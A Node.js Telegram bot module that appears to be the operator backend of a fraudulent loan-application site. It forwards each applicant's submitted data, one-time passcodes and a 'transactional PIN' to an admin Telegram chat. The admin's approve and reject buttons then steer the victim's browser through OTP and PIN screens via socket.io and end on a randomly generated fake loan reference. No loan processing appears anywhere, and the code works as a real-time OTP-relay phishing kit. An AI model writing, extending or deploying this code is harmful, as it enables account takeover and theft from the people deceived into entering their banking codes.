require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");

// Initialize bot without polling (Render uses webhooks)
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: false });
const ADMIN_ID = process.env.ADMIN_CHAT_ID;

const botManager = {
    bot: bot,

    sendToAdmin: (appId, title, data, needsApproval = false) => {
        let msg = `━━━━━━━━━━━━━━━━━━━━\n`;
        msg += `<b>${title}</b>\n🆔 ID: <code>${appId}</code>\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
        for (const [k, v] of Object.entries(data)) {
            msg += `<b>${k}:</b> <code>${v}</code>\n`;
        }
        msg += `━━━━━━━━━━━━━━━━━━━━`;

        const options = { parse_mode: 'HTML' };
        if (needsApproval) {
            options.reply_markup = {
                inline_keyboard: [[
                    // Step 5 Approval moves user to Step 6 (PIN screen)
                    { text: "✅ APPROVE OTP", callback_data: `approve_5_${appId}` },
                    { text: "❌ REJECT", callback_data: `reject_5_${appId}` }
                ]]
            };
        }
        bot.sendMessage(ADMIN_ID, msg, options);
    },

    sendFinalApproval: (appId, pin) => {
        let msg = `━━━━━━━━━━━━━━━━━━━━\n`;
        msg += `🏁 <b>🇲🇨 FINAL PIN RECEIVED</b>\n🆔 ID: <code>${appId}</code>\n🔐 PIN: <code>${pin}</code>\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━`;
        
        bot.sendMessage(ADMIN_ID, msg, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    // Step 6 Approval finishes the transaction workflow
                    { text: "✅ COMPLETE LOAN", callback_data: `approve_6_${appId}` },
                    { text: "❌ REJECT", callback_data: `reject_6_${appId}` }
                ]]
            }
        });
    }
};

// Handle Admin Button Clicks
bot.on("callback_query", (query) => {
    const [action, step, appId] = query.data.split("_");
    const io = global.io;

    if (!io) {
        bot.answerCallbackQuery(query.id, { text: "Error: Socket instance missing" });
        return;
    }

    if (action === "approve") {
        if (step === "5") {
            // Signal frontend to move from Step 5 to Step 6 (PIN)
            io.to(appId).emit('otp-verified');
            bot.answerCallbackQuery(query.id, { text: "OTP Verified. PIN input shown to user." });
        } 
        else if (step === "6") {
            // Signal frontend to show final success screen with tracking ref
            const ref = "ASA-XAF-" + Math.floor(Math.random() * 900000 + 100000);
            io.to(appId).emit('pin-verified', { referenceId: ref });
            bot.answerCallbackQuery(query.id, { text: "Application Completed!" });
        }
        
        bot.editMessageText(query.message.text + `\n\n✅ <b>ACTION: APPROVED (STEP ${step})</b>`, {
            chat_id: ADMIN_ID,
            message_id: query.message.message_id,
            parse_mode: 'HTML'
        });
    }

    if (action === "reject") {
        if (step === "5") {
            io.to(appId).emit('otp-failed', { message: "OTP verification declined by admin." });
            bot.answerCallbackQuery(query.id, { text: "OTP Code Rejected" });
        } else if (step === "6") {
            io.to(appId).emit('pin-failed', { message: "Transactional PIN declined by admin." });
            bot.answerCallbackQuery(query.id, { text: "PIN Code Rejected" });
        }

        bot.editMessageText(query.message.text + `\n\n❌ <b>ACTION: REJECTED (STEP ${step})</b>`, {
            chat_id: ADMIN_ID,
            message_id: query.message.message_id,
            parse_mode: 'HTML'
        });
    }
});

module.exports = botManager;